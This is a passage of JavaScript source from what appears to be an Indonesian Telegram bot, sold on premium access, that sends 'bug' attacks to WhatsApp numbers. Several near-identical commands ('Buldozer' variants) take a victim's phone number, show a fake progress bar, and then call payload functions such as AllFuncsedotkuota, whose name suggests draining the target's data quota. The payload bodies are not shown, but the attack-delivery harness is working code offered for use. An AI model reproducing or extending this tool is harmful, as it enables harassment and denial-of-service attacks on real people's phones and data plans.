        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Traindpaket(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Buldozer1Gb\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Traindpaket(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Buldozer50Gb\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await Traindpaket(target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//




//AKHIR CASE BULDOZER STUNT//



//=======CASE BUG=========//
bot.onText(/\/BuldozerX\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await AllFuncsedotkuota(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/BuldozerV2X\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await AllFuncsedotkuota(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/BuldozerV3X\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Jika user tidak memasukkan nomor
  const input = match[1]?.trim();
  if (!input) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Kamu belum memasukkan nomor target!\n\n📌 Contoh penggunaan:\n/Comandnya 62xxxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  // Format nomor hanya angka
  const formattedNumber = input.replace(/[^0-9]/g, "");
  if (!formattedNumber.startsWith("62") || formattedNumber.length < 10) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Format nomor salah!\n\n📌 Gunakan format internasional (diawali 62):\nContoh: /Comandnya 62xxx",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  const target = `${formattedNumber}@s.whatsapp.net`;

  // Cek akses premium
  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: "❌ Sorry, kamu belum punya akses menggunakan perintah ini.",
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Iɴғᴏʀᴍᴀsɪ", url: "https://t.me/scriptqueenmvaa" }]],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang aktif. Silakan sambungkan bot terlebih dahulu dengan perintah:\n/Addsender 62xxx"
      );
    }

    // Kirim pesan awal dengan progress
    const sentMessage = await bot.sendPhoto(
      chatId,
      "https://files.catbox.moe/ii0zys.png",
      {
        caption: `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ Pʀᴏsᴇs : [□□□□□□□□□□] 0%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        parse_mode: "Markdown",
      }
    );

    const progressStages = [
      { text: "Pʀᴏsᴇs : [■□□□□□□□□□] 10%", delay: 300 },
      { text: "Pʀᴏsᴇs : [■■■□□□□□□□] 30%", delay: 400 },
      { text: "Pʀᴏsᴇs : [■■■■■□□□□□] 50%", delay: 500 },
      { text: "Pʀᴏsᴇs : [■■■■■■■□□□] 70%", delay: 600 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■□] 90%", delay: 700 },
      { text: "Pʀᴏsᴇs : [■■■■■■■■■■] 100%", delay: 800 },
    ];

    for (const stage of progressStages) {
      await new Promise((r) => setTimeout(r, stage.delay));
      await bot.editMessageCaption(
        `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴛᴀᴛᴜs : Pʀᴏsᴇs
│ ${stage.text}
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
        `,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "Markdown",
        }
      );
    }

    await bot.editMessageCaption(
      `
\`\`\`
[  ✧ 𝗠𝗶̭̬𝗽⃭𝗮⃬𝗮  𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️  ]
┏──────────────────────────┓
│ Pᴇɴɢɪʀɪᴍ : ${chatId}
│ Tᴀʀɢᴇᴛ : ${formattedNumber}
│ Sᴇɴᴅᴇʀ : ${sessions.size}
│ Sᴛᴀᴛᴜs : Sᴜᴋsᴇs
│ Pʀᴏsᴇs : [■■■■■■■■■■] 100%
│ 
│ ©𝗠𝗼̶𝗱⃭𝗱⃬𝗲𝗿̭̬𝘀 〽️
┗──────────────────────────┛
\`\`\`
      `,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cᴇᴋ Tᴀʀɢᴇᴛ", url: `https://wa.me/${formattedNumber}` }],
          ],
        },
      }
    );

    // Eksekusi bug setelah progres selesai
    console.log("Proses send bug [ marga modders 〽️ ]");
      await AllFuncsedotkuota(30, target);
    console.log("Sukses send bug [ marga modders 〽️ ]");

  } catch (error) {
    console.error("❌ ERROR:", error.message);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan: ${error.message}`);
  }
});
//=======CASE BUG=========//
//=======CASE BUG=========//
bot.onText(/\/Buldozer1GbX\s*(.*)/, async (msg, match) => {
  const randomImage = getRandomImage();
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

